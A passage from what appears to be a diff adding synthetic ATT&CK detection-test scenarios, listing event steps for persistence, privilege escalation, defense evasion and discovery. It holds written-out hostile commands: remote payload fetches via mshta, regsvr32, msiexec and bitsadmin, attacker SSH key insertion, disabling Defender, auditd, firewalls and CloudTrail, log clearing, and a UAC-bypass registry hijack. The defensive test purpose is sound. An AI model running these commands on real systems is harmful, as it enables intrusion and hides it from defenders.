+     "key": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+     "operation": "set",
+     "value_name": "Userinit",
+     "value_data": "C:\\Windows\\system32\\userinit.exe,C:\\ProgramData\\x.exe"
+    }
+   ],
+   "expect": [
+    "T1547.004"
+   ]
+  },
+  {
+   "id": "emu-t1546-010-appinit-dlls",
+   "name": "AppInit DLL registration",
+   "description": "Synthetic event sequence emulating T1546.010: appinit dll registration. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1546.010"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "registry",
+     "key": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
+     "operation": "set",
+     "value_name": "AppInit_DLLs",
+     "value_data": "C:\\ProgramData\\hook.dll"
+    }
+   ],
+   "expect": [
+    "T1546.010"
+   ]
+  },
+  {
+   "id": "emu-t1098-004-ssh-authkeys",
+   "name": "Append an attacker key to authorized_keys",
+   "description": "Synthetic event sequence emulating T1098.004: append an attacker key to authorized_keys. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1098.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "echo 'ssh-ed25519 AAAAC3Nza attacker@box' >> /home/ann/.ssh/authorized_keys",
+     "parent_exe": "/usr/sbin/sshd"
+    },
+    {
+     "type": "file",
+     "path": "/home/ann/.ssh/authorized_keys",
+     "operation": "modify"
+    }
+   ],
+   "expect": [
+    "T1098.004"
+   ]
+  },
+  {
+   "id": "emu-t1546-004-bashrc-hook",
+   "name": "Shell profile modification",
+   "description": "Synthetic event sequence emulating T1546.004: shell profile modification. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1546.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/home/ann/.bashrc",
+     "operation": "modify"
+    },
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "echo 'nohup /tmp/.x &' >> ~/.bashrc",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1546.004"
+   ]
+  },
+  {
+   "id": "emu-t1136-001-new-local-user",
+   "name": "Create a local user with a shell",
+   "description": "Synthetic event sequence emulating T1136.001: create a local user with a shell. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1136.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/useradd",
+     "command": "useradd -m -s /bin/bash -G sudo support",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1136.001"
+   ]
+  },
+  {
+   "id": "emu-t1136-001-net-user-add",
+   "name": "net user /add and admin group",
+   "description": "Synthetic event sequence emulating T1136.001: net user /add and admin group. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1136.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\net.exe",
+     "command": "net user svc_backup P@ssw0rd! /add",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1136.001"
+   ]
+  },
+  {
+   "id": "emu-t1037-004-rc-local",
+   "name": "Persistence through rc.local",
+   "description": "Synthetic event sequence emulating T1037.004: persistence through rc.local. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1037.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/etc/rc.local",
+     "operation": "modify"
+    }
+   ],
+   "expect": [
+    "T1037.004"
+   ]
+  },
+  {
+   "id": "emu-t1574-006-ld-preload",
+   "name": "Dynamic linker preload hijack",
+   "description": "Synthetic event sequence emulating T1574.006: dynamic linker preload hijack. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1574.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/etc/ld.so.preload",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1574.006"
+   ]
+  },
+  {
+   "id": "emu-t1547-006-kernel-module-load",
+   "name": "Insert an out-of-tree kernel module",
+   "description": "Synthetic event sequence emulating T1547.006: insert an out-of-tree kernel module. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1547.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/sbin/insmod",
+     "command": "insmod /tmp/diamorphine.ko",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1547.006"
+   ]
+  },
+  {
+   "id": "emu-t1505-003-webshell-drop",
+   "name": "PHP web shell written to the web root",
+   "description": "Synthetic event sequence emulating T1505.003: php web shell written to the web root. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1505.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/var/www/html/uploads/cmd.php",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1505.003"
+   ]
+  },
+  {
+   "id": "emu-t1547-015-login-item",
+   "name": "Login item through osascript",
+   "description": "Synthetic event sequence emulating T1547.015: login item through osascript. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1547.015"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/osascript",
+     "command": "osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"/tmp/h.app\"}'",
+     "parent_exe": "/bin/zsh"
+    }
+   ],
+   "expect": [
+    "T1547.015"
+   ]
+  },
+  {
+   "id": "emu-t1547-013-xdg-autostart",
+   "name": "XDG autostart desktop entry",
+   "description": "Synthetic event sequence emulating T1547.013: xdg autostart desktop entry. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1547.013"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/home/ann/.config/autostart/helper.desktop",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1547.013"
+   ]
+  },
+  {
+   "id": "emu-t1546-013-wmi-startup-ps-profile",
+   "name": "PowerShell profile planted",
+   "description": "Synthetic event sequence emulating T1546.013: powershell profile planted. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1546.013"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1",
+     "operation": "modify"
+    }
+   ],
+   "expect": [
+    "T1546.013"
+   ]
+  },
+  {
+   "id": "emu-t1548-001-setuid-bit",
+   "name": "Set the setuid bit on a shell copy",
+   "description": "Synthetic event sequence emulating T1548.001: set the setuid bit on a shell copy. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1548.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/chmod",
+     "command": "chmod u+s /tmp/bash",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1548.001"
+   ]
+  },
+  {
+   "id": "emu-t1548-003-sudoers-edit",
+   "name": "Passwordless sudo rule",
+   "description": "Synthetic event sequence emulating T1548.003: passwordless sudo rule. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1548.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "echo 'ann ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/ann",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1548.003"
+   ]
+  },
+  {
+   "id": "emu-t1548-002-uac-bypass-reg",
+   "name": "UAC bypass via ms-settings hijack",
+   "description": "Synthetic event sequence emulating T1548.002: uac bypass via ms-settings hijack. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1548.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "registry",
+     "key": "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
+     "operation": "set",
+     "value_data": "C:\\Users\\ann\\AppData\\Local\\Temp\\p.exe"
+    }
+   ],
+   "expect": [
+    "T1548.002"
+   ]
+  },
+  {
+   "id": "emu-t1611-container-escape",
+   "name": "Privileged container mounting the host root",
+   "description": "Synthetic event sequence emulating T1611: privileged container mounting the host root. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1611"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/docker",
+     "command": "docker run --privileged -v /:/host alpine chroot /host sh",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1611"
+   ]
+  },
+  {
+   "id": "emu-t1610-deploy-privileged-ctr",
+   "name": "Run a container with the host network",
+   "description": "Synthetic event sequence emulating T1610: run a container with the host network. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1610"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/docker",
+     "command": "docker run -d --net=host --pid=host --privileged ubuntu sleep 9999",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1610"
+   ]
+  },
+  {
+   "id": "emu-t1098-003-cloud-role-attach",
+   "name": "Attach an administrator policy",
+   "description": "Synthetic event sequence emulating T1098.003: attach an administrator policy. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1098.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws iam attach-user-policy --user-name dev --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1098.003"
+   ]
+  },
+  {
+   "id": "emu-t1070-003-clear-bash-history",
+   "name": "Clear shell history",
+   "description": "Synthetic event sequence emulating T1070.003: clear shell history. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "history -c && rm -f ~/.bash_history",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1070.003"
+   ]
+  },
+  {
+   "id": "emu-t1070-001-wevtutil-clear",
+   "name": "Clear event logs",
+   "description": "Synthetic event sequence emulating T1070.001: clear event logs. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\wevtutil.exe",
+     "command": "wevtutil cl Security",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1070.001"
+   ]
+  },
+  {
+   "id": "emu-t1070-002-truncate-syslog",
+   "name": "Truncate system logs",
+   "description": "Synthetic event sequence emulating T1070.002: truncate system logs. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/truncate",
+     "command": "truncate -s 0 /var/log/auth.log",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1070.002"
+   ]
+  },
+  {
+   "id": "emu-t1070-006-timestomp-touch",
+   "name": "Backdate a file timestamp",
+   "description": "Synthetic event sequence emulating T1070.006: backdate a file timestamp. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/touch",
+     "command": "touch -r /bin/ls /tmp/.implant",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1070.006"
+   ]
+  },
+  {
+   "id": "emu-t1562-001-defender-disable",
+   "name": "Disable Defender real-time monitoring",
+   "description": "Synthetic event sequence emulating T1562.001: disable defender real-time monitoring. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command": "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1562.001"
+   ]
+  },
+  {
+   "id": "emu-t1562-001-stop-edr-service",
+   "name": "Stop a security agent service",
+   "description": "Synthetic event sequence emulating T1562.001: stop a security agent service. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/systemctl",
+     "command": "systemctl stop auditd falcon-sensor",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1562.001"
+   ]
+  },
+  {
+   "id": "emu-t1562-012-auditd-disable",
+   "name": "Disable Linux auditing",
+   "description": "Synthetic event sequence emulating T1562.012: disable linux auditing. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.012"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/sbin/auditctl",
+     "command": "auditctl -e 0",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1562.012"
+   ]
+  },
+  {
+   "id": "emu-t1562-004-firewall-off-win",
+   "name": "Turn off the host firewall",
+   "description": "Synthetic event sequence emulating T1562.004: turn off the host firewall. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\netsh.exe",
+     "command": "netsh advfirewall set allprofiles state off",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1562.004"
+   ]
+  },
+  {
+   "id": "emu-t1562-004-ufw-disable",
+   "name": "Disable ufw",
+   "description": "Synthetic event sequence emulating T1562.004: disable ufw. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/ufw",
+     "command": "ufw disable",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1562.004"
+   ]
+  },
+  {
+   "id": "emu-t1562-003-histcontrol-off",
+   "name": "Turn off history logging",
+   "description": "Synthetic event sequence emulating T1562.003: turn off history logging. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "unset HISTFILE; export HISTSIZE=0",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1562.003"
+   ]
+  },
+  {
+   "id": "emu-t1562-008-cloudtrail-stop",
+   "name": "Stop cloud audit logging",
+   "description": "Synthetic event sequence emulating T1562.008: stop cloud audit logging. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.008"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws cloudtrail stop-logging --name main",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1562.008"
+   ]
+  },
+  {
+   "id": "emu-t1218-005-mshta-remote",
+   "name": "mshta fetching a remote script",
+   "description": "Synthetic event sequence emulating T1218.005: mshta fetching a remote script. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1218.005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\mshta.exe",
+     "command": "mshta.exe http://203.0.113.9/payload.hta",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1218.005"
+   ]
+  },
+  {
+   "id": "emu-t1218-010-regsvr32-scrobj",
+   "name": "regsvr32 remote scriptlet",
+   "description": "Synthetic event sequence emulating T1218.010: regsvr32 remote scriptlet. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1218.010"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\regsvr32.exe",
+     "command": "regsvr32 /s /n /u /i:http://203.0.113.9/x.sct scrobj.dll",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1218.010"
+   ]
+  },
+  {
+   "id": "emu-t1218-011-rundll32-js",
+   "name": "rundll32 running javascript",
+   "description": "Synthetic event sequence emulating T1218.011: rundll32 running javascript. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1218.011"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\rundll32.exe",
+     "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";alert(1)",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1218.011"
+   ]
+  },
+  {
+   "id": "emu-t1218-004-installutil-proxy",
+   "name": "InstallUtil executing an assembly",
+   "description": "Synthetic event sequence emulating T1218.004: installutil executing an assembly. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1218.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
+     "command": "InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\ann\\AppData\\Local\\Temp\\a.dll",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1218.004"
+   ]
+  },
+  {
+   "id": "emu-t1218-007-msiexec-remote",
+   "name": "msiexec installing from a URL",
+   "description": "Synthetic event sequence emulating T1218.007: msiexec installing from a url. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1218.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\msiexec.exe",
+     "command": "msiexec /q /i http://203.0.113.9/p.msi",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1218.007"
+   ]
+  },
+  {
+   "id": "emu-t1127-001-msbuild-inline",
+   "name": "MSBuild project run from a temp directory",
+   "description": "Synthetic event sequence emulating T1127.001: msbuild project run from a temp directory. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1127.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+     "command": "MSBuild.exe C:\\Users\\ann\\AppData\\Local\\Temp\\build.xml",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1127.001"
+   ]
+  },
+  {
+   "id": "emu-t1197-bitsadmin-transfer",
+   "name": "BITS job download",
+   "description": "Synthetic event sequence emulating T1197: bits job download. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1197"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\bitsadmin.exe",
+     "command": "bitsadmin /transfer j /download /priority high http://203.0.113.9/m.exe C:\\Users\\Public\\m.exe",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1197"
+   ]
+  },
+  {
+   "id": "emu-t1140-certutil-decode",
+   "name": "certutil decoding a payload",
+   "description": "Synthetic event sequence emulating T1140: certutil decoding a payload. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1140"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\certutil.exe",
+     "command": "certutil -decode C:\\Users\\Public\\a.b64 C:\\Users\\Public\\a.exe",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1140"
+   ]
+  },
+  {
+   "id": "emu-t1140-base64-decode-run",
+   "name": "Decode and execute a base64 blob",
+   "description": "Synthetic event sequence emulating T1140: decode and execute a base64 blob. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1140"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "echo ZWNobyBoaQ== | base64 -d | sh",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1140"
+   ]
+  },
+  {
+   "id": "emu-t1564-001-hidden-dotfile",
+   "name": "Hidden directory in /tmp",
+   "description": "Synthetic event sequence emulating T1564.001: hidden directory in /tmp. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1564.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/mkdir",
+     "command": "mkdir -p /tmp/.cache-x/.d",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "file",
+     "path": "/tmp/.cache-x/.d/agent",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1564.001"
+   ]
+  },
+  {
+   "id": "emu-t1553-001-gatekeeper-bypass",
+   "name": "Strip the quarantine attribute",
+   "description": "Synthetic event sequence emulating T1553.001: strip the quarantine attribute. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1553.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/xattr",
+     "command": "xattr -d com.apple.quarantine /Users/ann/Downloads/app.app",
+     "parent_exe": "/bin/zsh"
+    }
+   ],
+   "expect": [
+    "T1553.001"
+   ]
+  },
+  {
+   "id": "emu-t1553-004-root-cert-install",
+   "name": "Install a root certificate",
+   "description": "Synthetic event sequence emulating T1553.004: install a root certificate. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1553.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\certutil.exe",
+     "command": "certutil -addstore -f Root C:\\Users\\Public\\ca.crt",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1553.004"
+   ]
+  },
+  {
+   "id": "emu-t1055-008-ptrace-inject",
+   "name": "Attach to a process with ptrace",
+   "description": "Synthetic event sequence emulating T1055.008: attach to a process with ptrace. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1055.008"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/gdb",
+     "command": "gdb --pid 1234 --batch -ex 'call dlopen(\"/tmp/p.so\",2)'",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1055.008"
+   ]
+  },
+  {
+   "id": "emu-t1222-002-chmod-777-etc",
+   "name": "Loosen permissions broadly",
+   "description": "Synthetic event sequence emulating T1222.002: loosen permissions broadly. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1222.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/chmod",
+     "command": "chmod -R 777 /etc/",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1222.002"
+   ]
+  },
+  {
+   "id": "emu-t1222-001-icacls-grant",
+   "name": "Grant everyone full control",
+   "description": "Synthetic event sequence emulating T1222.001: grant everyone full control. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1222.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\icacls.exe",
+     "command": "icacls C:\\Windows\\System32\\config /grant Everyone:F /T",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1222.001"
+   ]
+  },
+  {
+   "id": "emu-t1036-005-masquerade-path",
+   "name": "Process named like a kernel thread from /tmp",
+   "description": "Synthetic event sequence emulating T1036.005: process named like a kernel thread from /tmp. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1036.005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/tmp/[kworker/0:1]",
+     "command": "[kworker/0:1] --daemon",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1036.005"
+   ]
+  },
+  {
+   "id": "emu-t1497-001-sandbox-check-mac",
+   "name": "Virtual machine check via sysctl",
+   "description": "Synthetic event sequence emulating T1497.001: virtual machine check via sysctl. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1497.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/sysctl",
+     "command": "sysctl -n machdep.cpu.features hw.model",
+     "parent_exe": "/bin/zsh"
+    }
+   ],
+   "expect": [
+    "T1497.001"
+   ]
+  },
+  {
+   "id": "emu-t1069-002-domain-groups",
+   "name": "Enumerate domain admins",
+   "description": "Synthetic event sequence emulating T1069.002: enumerate domain admins. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1069.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\net.exe",
+     "command": "net group \"Domain Admins\" /domain",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1069.002"
+   ]
+  },
+  {
+   "id": "emu-t1482-domain-trust",
+   "name": "Enumerate domain trusts",
+   "description": "Synthetic event sequence emulating T1482: enumerate domain trusts. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1482"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\nltest.exe",
+     "command": "nltest /domain_trusts /all_trusts",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1482"
+   ]
+  },
